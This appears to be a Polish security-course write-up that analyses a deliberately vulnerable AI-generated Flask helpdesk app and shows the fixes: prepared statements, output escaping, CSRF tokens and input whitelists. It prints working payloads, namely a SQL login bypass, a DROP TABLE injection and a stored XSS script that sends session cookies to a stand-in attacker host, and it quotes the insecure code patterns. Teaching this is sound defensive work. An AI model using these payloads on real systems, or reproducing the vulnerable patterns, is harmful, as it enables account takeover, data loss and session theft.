# Tydzień 7 — Injection, XSS i CSRF

Moduł zgłoszeń wygenerowany przez AI (wersja celowo podatna:
[`original_ai_version/app_insecure.py`](../original_ai_version/app_insecure.py)),
analiza luk i wersja poprawiona.

## 1. Prompt do AI (wersja podatna)

> Napisz prostą aplikację Flask. Helpdesk dla sklepu internetowego. Formularz
> logowania (email + hasło), formularz tworzenia zgłoszenia (tytuł, opis,
> priorytet: niski/średni/wysoki), lista zgłoszeń zalogowanego użytkownika.
> Dane w SQLite. Nie komplikuj — użyj render_template_string i prostych zapytań SQL.

## 2. Znalezione luki

### Luka 1 — SQL Injection w logowaniu

```python
query = "SELECT id, email, role FROM users WHERE email = '" + email + "' AND password = '" + password + "'"
```

- **Payload:** email: `' OR '1'='1'--`, hasło: cokolwiek
- **Zbudowane zapytanie:** `SELECT ... WHERE email = '' OR '1'='1'-- AND password = 'x'`
- **Efekt:** warunek zawsze prawdziwy → baza zwraca pierwszego usera (admina) → logowanie bez hasła
- **Co idzie źle:** dane użytkownika wklejane wprost do SQL; interpreter traktuje payload jako składnię

### Luka 2 — SQL Injection przy tworzeniu zgłoszenia

```python
query = "INSERT INTO zgloszenia (...) VALUES ('" + tytul + "', '" + opis + "'...)"
```

- **Payload w polu tytuł:** `test'); DROP TABLE zgloszenia;--`
- **Efekt:** w bazach ze stacked queries (MySQL, PostgreSQL) tabela usunięta
- **Co idzie źle:** brak separacji danych od instrukcji

### Luka 3 — Stored XSS w liście zgłoszeń

```jinja
{{ z[1]|safe }}  {# |safe wyłącza automatyczne escapowanie Jinja2 #}
```

- **Typ:** Stored XSS (payload zapisany w bazie, odpala się przy każdym otwarciu listy)
- **Payload:** `<script>document.location="http://attacker.pl/steal?c="+document.cookie</script>`
- **Efekt:** przeglądarka wykonuje skrypt → cookie sesji ofiary leci do atakującego

### Luka 4 — CSRF przy tworzeniu zgłoszenia

- **Scenariusz:** atakujący tworzy stronę z ukrytym formularzem POST na `/nowe_zgloszenie`; ofiara wchodzi → jej przeglądarka wysyła POST z jej ciasteczkami
- **Co idzie źle:** serwer akceptuje każdy POST z ważną sesją; brak tokenu = nie odróżnia żądania ofiary od podstawionego

### Luka 5 — Hasła plain text

```python
cur.execute("INSERT INTO users VALUES (1, 'admin@sklep.pl', 'admin123', 'admin')")
```

## 3. Analiza z perspektywy pentestera

| Fragment kodu | Podatność | Możliwy atak |
|---------------|-----------|--------------|
| `login()` — konkatenacja SQL | SQL Injection | ominięcie logowania bez hasła |
| `nowe_zgloszenie()` — konkatenacja SQL | SQL Injection | wstrzyknięcie DDL/DML, usuwanie danych |
| `ZGLOSZENIA_HTML` z `\|safe` | Stored XSS | kradzież cookie/sesji, przejęcie konta |
| brak tokenu CSRF | CSRF | zewnętrzna strona tworzy zgłoszenia w imieniu ofiary |
| hasła plain text | Credential Exposure | po wycieku bazy wszystkie hasła jawne |
| `secret_key = 'helpdesk123'` | Weak Secret | podrobienie ciasteczka sesji |
| brak rate limitingu | Brute Force | automatyczne zgadywanie haseł |

## 4. Poprawki

### 4.1 SQL Injection → prepared statements

```python
user = db.execute(
    "SELECT id, email, password_hash, role FROM users WHERE email = ?",
    (email,),
).fetchone()
```

Silnik bazy kompiluje zapytanie osobno od danych — payload `' OR '1'='1'--`
jest traktowany jako zwykły string. Zasada: **separacja danych od instrukcji**.

### 4.2 XSS → output encoding

```jinja
{{ z["tytul"] }}  {# bez |safe — Jinja2 zamienia < na &lt; itd. #}
```

Payload `<script>...</script>` wyświetla się jako tekst, nie wykonuje się.
Zasada: **output encoding**.

### 4.3 CSRF → token w sesji

```python
# GET: generowanie tokenu
session["csrf_token"] = os.urandom(32).hex()
# POST: weryfikacja
if request.form.get("csrf_token") != session.get("csrf_token"):
    return "Blad CSRF", 403
```

```html
<input type="hidden" name="csrf_token" value="{{ csrf_token }}">
```

Zewnętrzna strona nie może odczytać tokenu, więc sfałszowane żądanie zostaje
odrzucone. Druga warstwa: cookie z `SameSite=Strict`. Zasada: **defense in depth**.

### 4.4 Walidacja wejścia + whitelist

```python
PRIORYTETY = {"niski", "sredni", "wysoki"}  # whitelist
if priorytet not in PRIORYTETY:
    error = "Nieprawidlowa wartosc priorytetu."
```

Walidacja na backendzie, nie tylko w HTML. Whitelist zamiast blacklist.
Zasada: **input validation**.

## 5. Powiązanie ze STRIDE

| STRIDE | Zagrożenie | Luka | Mechanizm obronny |
|--------|------------|------|-------------------|
| S | ominięcie logowania bez hasła | SQLi `' OR '1'='1'--` | prepared statements, bcrypt, rate limiting |
| T | modyfikacja/usunięcie danych | SQLi stacked query | parametryzacja, walidacja wejść |
| T | nieautoryzowane zgłoszenie | CSRF | token CSRF, SameSite=Strict |
| I | kradzież sesji | Stored XSS | escapowanie Jinja2 (bez `\|safe`), HttpOnly cookie |
| I | odczyt danych z bazy | SQLi UNION-based | prepared statements, least privilege |
| E | zalogowanie jako admin | SQLi zwraca pierwszego usera | prepared statements, RBAC na backendzie |

Wersja poprawiona z tymi mechanizmami: [`app/app.py`](../app/app.py).
